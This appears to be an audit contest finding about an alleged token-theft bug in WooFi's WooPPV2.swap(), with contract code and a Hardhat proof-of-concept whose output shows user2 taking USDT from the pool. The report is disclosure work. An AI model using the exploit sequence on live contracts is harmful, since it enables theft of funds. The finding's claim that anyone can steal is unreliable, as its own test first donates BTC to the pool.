Orbiting Cinnamon Baboon

high

# Tokens can be stolen in WooPPV2.swap()

## Summary
In `WooPPV2`, tokens can be stolen because the pool doesn't transfer tokens from function caller.

## Vulnerability Detail
In `WooPPV2.swap`, the functions checks if the swapped token is quote token or not. If both `tokenIn` and `tokenOut` are non-quote token, [`_swapBaseToBase`](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L513) is then called.

```solidity
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minToAmount,
        address to,
        address rebateTo
    ) external override returns (uint256 realToAmount) {
        if (fromToken == quoteToken) {
            // case 1: quoteToken --> baseToken
            realToAmount = _sellQuote(toToken, fromAmount, minToAmount, to, rebateTo);
        } else if (toToken == quoteToken) {
            // case 2: fromToken --> quoteToken
            realToAmount = _sellBase(fromToken, fromAmount, minToAmount, to, rebateTo);
        } else {
            // case 3: fromToken --> toToken (base to base)
            realToAmount = _swapBaseToBase(fromToken, toToken, fromAmount, minToAmount, to, rebateTo);
        }
    }
```

Later in this internal function, after price calculation and other operations, swapped `amountOut` token will be transferred to recipient. But `tokenIn` is never transferred from sender to the pool. Makes any user can steal tokens from the pool.

## Impact
Tokens can be stolen by anyone. In the following code, `user2` swaps BTC with USDT, but user2 never approves the pool to transfer BTC:

```typescript
      it("swapBaseToBase audit test 2", async () => {
        _clearUser2Balance();
  
        await btcToken.approve(wooPP.address, ONE.mul(10));
        await wooPP.deposit(btcToken.address, ONE.mul(10));
  
        await usdtToken.approve(wooPP.address, ONE.mul(300000));
        await wooPP.deposit(usdtToken.address, ONE.mul(300000));
  
        await wooToken.approve(wooPP.address, ONE.mul(1000000));
        await wooPP.deposit(wooToken.address, ONE.mul(1000000));
  
        await btcToken.mint(user1.address, ONE.mul(3));
        await usdtToken.mint(user1.address, ONE.mul(100000));

        const base1Amount = ONE;

        await btcToken.connect(user1).transfer(wooPP.address, base1Amount);


        console.log("user btc balance:", await btcToken.balanceOf(user2.address));
        console.log("user usdt balance:", await usdtToken.balanceOf(user2.address));
        console.log("pool btc balance:", await btcToken.balanceOf(wooPP.address));
        console.log("pool usdt balance:", await usdtToken.balanceOf(wooPP.address));

        await wooPP
            .connect(user2)
            .swap(btcToken.address, usdtToken.address, ONE.div(100), 0, user2.address, ZERO_ADDR);
  
        console.log("user btc balance:", await btcToken.balanceOf(user2.address));
        console.log("user usdt balance:", await usdtToken.balanceOf(user2.address));
        console.log("pool btc balance:", await btcToken.balanceOf(wooPP.address));
        console.log("pool usdt balance:", await usdtToken.balanceOf(wooPP.address));


      });

```

Where user2 starts with no balance in BTC and USDT, and  tries to call swap to swap out some USDT out. The running test result is:

```text
user btc balance: BigNumber { value: "0" }
user usdt balance: BigNumber { value: "0" }
pool btc balance: BigNumber { value: "11000000000000000000" }
pool usdt balance: BigNumber { value: "300000000000000000000000" }
user btc balance: BigNumber { value: "0" }
user usdt balance: BigNumber { value: "199600160040000000000" }
pool btc balance: BigNumber { value: "11000000000000000000" }
pool usdt balance: BigNumber { value: "299800399839960000000000" }
```
And we can see, user2 stole USDT out of the pool.

## Code Snippet
```solidity
    function _swapBaseToBase(
        address baseToken1,
        address baseToken2,
        uint256 base1Amount,
        uint256 minBase2Amount,
        address to,
        address rebateTo
    ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {
        require(baseToken1 != address(0) && baseToken1 != quoteToken, "WooPPV2: !baseToken1");
        require(baseToken2 != address(0) && baseToken2 != quoteToken, "WooPPV2: !baseToken2");
        require(to != address(0), "WooPPV2: !to");

        require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, "WooPPV2: !BASE1_BALANCE");

        // @note what happens when token1 == token2?
        IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);
        IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);

        uint256 swapFee;
        uint256 quoteAmount;
        {
            uint64 spread = _maxUInt64(state1.spread, state2.spread) / 2;
            uint16 feeRate = _maxUInt16(tokenInfos[baseToken1].feeRate, tokenInfos[baseToken2].feeRate);

            state1.spread = spread;
            state2.spread = spread;

            uint256 newBase1Price;
            (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);
            IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));
            console.log('Post new base1 price:', newBase1Price, newBase1Price/1e8);

            swapFee = (quoteAmount * feeRate) / 1e5;
        }

        quoteAmount = quoteAmount - swapFee;
        unclaimedFee = unclaimedFee + swapFee;

        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve - swapFee);
        tokenInfos[baseToken1].reserve = uint192(tokenInfos[baseToken1].reserve + base1Amount);

        {
            uint256 newBase2Price;
            (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);
            IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));
            console.log('Post new base2 price:', newBase2Price, newBase2Price/1e8);
            require(base2Amount >= minBase2Amount, "WooPPV2: base2Amount_LT_minBase2Amount");
        }

        tokenInfos[baseToken2].reserve = uint192(tokenInfos[baseToken2].reserve - base2Amount);

        if (to != address(this)) {
            TransferHelper.safeTransfer(baseToken2, to, base2Amount);
        }

        emit WooSwap(
            baseToken1,
            baseToken2,
            base1Amount,
            base2Amount,
            msg.sender,
            to,
            rebateTo,
            quoteAmount + swapFee,
            swapFee
        );
    }

```

## Tool used

Manual Review

## Recommendation
Transfer required amount of `tokenIn` when doing swap.
